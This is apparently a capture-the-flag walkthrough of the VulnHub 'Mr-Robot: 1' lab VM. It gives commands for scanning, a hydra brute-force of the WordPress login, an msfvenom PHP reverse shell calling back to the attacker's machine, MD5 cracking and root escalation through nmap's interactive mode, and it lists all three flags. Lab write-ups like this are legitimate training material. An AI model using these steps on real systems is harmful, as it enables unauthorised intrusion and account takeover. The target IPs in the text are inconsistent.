# Mr-Robot: 1
[VulnHub link](https://www.vulnhub.com/entry/mr-robot-1,151/)  
By Leon Johnson

Walkthrough:
* We are first greeted with a login page that is in command-line style, requiring users to specify both the username and the password:
![](/screenshots/mr-robot-1/Login.jpg)
* We try some common login credentials such as `admin:admin` and `admin:password`, which is incorrect.
* Run `nmap 10.0.2.*`, where we find 5 live hosts:
![](/screenshots/mr-robot-1/nmapScan.jpg)
* After eliminating our own IP address (`ifconfig`: 10.0.2.15) and our router gateway IP address (`route -n`: 10.0.2.1), we find that out of the 3 hosts, `10.0.2.5` can run SSH, HTTP and HTTPS services (of which the ports for the latter 2 are open), which is of interest to us as compared to the other hosts. We will start exploring this live host first.
* Run `nmap -p- -A 10.0.2.5`:
![](/screenshots/mr-robot-1/hostFullScan.jpg)
* Open `10.0.2.5` on our browser and we get an interactive-style page greeting us, leaving us with a "Terminal" where we can execute several restricted commands:
![](/screenshots/mr-robot-1/interactiveSite.jpg)
* Executing any of the commands yields either a video or a series of stories with pictures. `join` prompts for an email, but nothing happens either.
* Run `uniscan -u 10.0.2.5 -qwe`:
![](/screenshots/mr-robot-1/uniscanResults.jpg)
* Note: uniscan is a Remote File Include, Local File Include and Remote Command Execution vulnerability scanner. -q enables directory checks, -w enables file checks and -e enables robots.txt and sitemap.xml check.
* uniscan vs. dirbuster: *to-be-added*
* From the scan results, we see that the site is running on WordPress, since the directory checks included links that ended with `wp-`.
* There is a robots.txt found from the scan's file checks. Open it and we see that there are 2 files listed: `fsocity.dic` and `key-1-of-3.txt`. The former is an unordered dictionary wordlist, while the latter reveals a string: `073403c8a58a1f80d943455fb30724b9`.
* It is likely that the dictionary file will be required for some sort of bruteforce attack later.
* `sitemap.xml` yields nothing .
* ...
* key-1-of-3.txt contains a string (`073403c8a58a1f80d943455fb30724b9`): after running hash-identifer against it, we know that it could be a MD5 hash.
* ...
* Head to the wp-login page of the WordPress site, and we try to login with some common login credentials. We find that the user `admin` does not exist ("invalid username").
* We have to find a way to see actual WordPress posts on the site (if any), since clicking "← Back to user's Blog!" on the login page brings us back to the interactive page that we initially encountered (which did not quite show us how we are able to escape that page to head to other pages of the site).
* To do so, we add a random parameter string to the end of the site (e.g. `/100`), in order to get the error message that the page cannot be found:
![](/screenshots/mr-robot-1/invalidPage.jpg)
* However, we are not able to find any posts on the site.
* Note: The walkthrough [here](https://www.youtube.com/watch?v=1-a-P1Q2AnA&t=322s) on YouTube shows that there is a post on the WordPress site, with the user `elliot`.
* Run `wpscan --url 10.0.2.5 --enumerate u` to find out a list of usernames of accounts on the WordPress site:
![](/screenshots/mr-robot-1/wpScanUsers.jpg)
* wpscan: a black box WordPress vulnerability scanner. *to-be-continued*
* Head to the WordPress login site and attempt to login with a random password for the username `elliot`. There is an error stating that the password for elliot is incorrect. Thus, we now know that the username elliot indeed exists, and our next step is to brute-force the password for that account.
* Run hydra 192.168.153.174 http-form-post "/wp-login.php:log=elliot&pwd=^PASS^:ERROR" -l elliot -P /tut/fsocity.dic -t 10 -w 30
* hydra: parallelized login cracker which supports numerous protocols to attack.
* Note: log and pwd are found by inspecting the input elements of the page's username and password fields through Developer Tools: `<input id="user_login" class="input" name="log"...>` and `<input id="user_pass" class="input" name="pwd"...>`
* The password (ER28-0652) is found somewhere at the bottom of the .dic file, thus it took quite some time to get it.
* After logging in as elliot, we are able to login and install as plugin called [File Manager](https://wordpress.org/plugins/wp-file-manager/).
* Run `msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.153.160 LPORT=4000 -f raw > shell.php` on our Kali VM to generate our payload. The LHOST is the IP address of our Kali VM.
* The payload is shell.php. Upload it through File Manager, and the file path is htdocs/wp-content/uploads/shell.php.
* Run `msfconsole` on our Kali VM. Run `use exploit/multi/handler` and `set payload php/meterpreter_reverse_tcp`.
* Run `set LPORT=4000` and `set LHOST=192.168.153.160` (IP address of our Kali VM).
* Run `exploit -j -z`. Open our reverse shell on the victim VM, and we will see from our Kali VM terminal that a session has been started.
* Run `sessions -i 1` then `sysinfo` to confirm that we are running on a Linux machine as detected earlier from our nmap/Zenmap scan.
* Navigate to our home directory and we find a directory called robot. Enter robot and we find key-2-of-3.txt and password.raw-md5.
* The key text file cannot be opened by us at the moment because the file is only readable by root, with no other permissions set. However, the password.raw-md5 file can be opened by us.
* We find the username `robot` and his password hash (`c3fcd3d76192e4007dfb496cca67e13b`) within the password file. Search for the original value behind the MD5 hash on the Google search engine, and we have now got the password (`abcdefghijklmnopqrstuvwxyz`) to robot.
* To-do: try to login via ssh using robot username and password. Ensure that the IP address of the victim VM is entered correctly.
* After logging in as robot, we find that we are able to open key-2-of-3.txt.
* We have to now find the last key, which is in /root. However, even after logging in as robot, we do not have the permission to navigate to /root. We have to do a privilege escalation here, using a badly configured nmap.
* Run `nmap`, `nmap --interactive` and then `!sh` to get a shell. `whoami` shows that we are now `root`.
* Head to /root and we find key-3-of-3.txt: `04787ddef27c3dee1ee161b21670b4e4`.
